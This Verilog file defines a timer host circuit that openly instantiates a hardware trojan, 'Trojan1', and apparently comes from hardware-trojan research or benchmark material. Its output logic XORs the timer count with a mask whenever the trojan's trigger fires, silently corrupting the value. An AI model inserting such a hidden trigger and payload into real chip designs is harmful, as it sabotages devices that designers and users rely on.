// Timer Host Circuit for Trojan1
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
module trojan1_timer_host #(
    parameter TIMER_WIDTH = 10,   // Timer counter width
    parameter TIMEOUT_VAL = 500,  // Timeout value
    parameter [15:0] R1_PATTERN = 16'hCAFE  // Pattern for r1 generation
)(
    input wire clk,
    input wire rst,
    input wire start_timer,
    input wire pause_timer,
    output reg [TIMER_WIDTH-1:0] timer_count,
    output reg timeout_flag,
    output reg timer_running
);

    // Trojan interface (fixed width)
    wire trojan_r1;
    wire trojan_trigger;
    
    // Internal timer logic
    reg [TIMER_WIDTH-1:0] counter;
    reg timer_active;
    reg [15:0] pattern_reg;
    reg [3:0] pattern_idx;
    
    // R1 signal generation using pattern
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pattern_reg <= R1_PATTERN;
            pattern_idx <= 4'b0;
        end else if (timer_active) begin
            pattern_idx <= pattern_idx + 1;
            if (pattern_idx == 4'hF)
                pattern_reg <= {pattern_reg[14:0], pattern_reg[15] ^ pattern_reg[7]};
        end
    end
    
    assign trojan_r1 = pattern_reg[pattern_idx];
    
    // Timer control logic
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            timer_active <= 1'b0;
            timer_running <= 1'b0;
        end else begin
            if (start_timer)
                timer_active <= 1'b1;
            else if (pause_timer || timeout_flag)
                timer_active <= 1'b0;
                
            timer_running <= timer_active;
        end
    end
    
    // Timer counter
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            counter <= {TIMER_WIDTH{1'b0}};
            timeout_flag <= 1'b0;
        end else if (start_timer) begin
            counter <= {TIMER_WIDTH{1'b0}};
            timeout_flag <= 1'b0;
        end else if (timer_active) begin
            if (counter >= TIMEOUT_VAL-1) begin
                timeout_flag <= 1'b1;
                counter <= {TIMER_WIDTH{1'b0}};
            end else begin
                counter <= counter + 1;
            end
        end
    end
    
    // Output logic with trojan trigger integration
    always @(posedge clk or posedge rst) begin
        if (rst)
            timer_count <= {TIMER_WIDTH{1'b0}};
        else
            // XOR timer count with trojan trigger
            timer_count <= counter ^ (trojan_trigger ? {{(TIMER_WIDTH-1){1'b1}}, 1'b0} : {TIMER_WIDTH{1'b0}});
    end
    
    // Instantiate Trojan1
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule
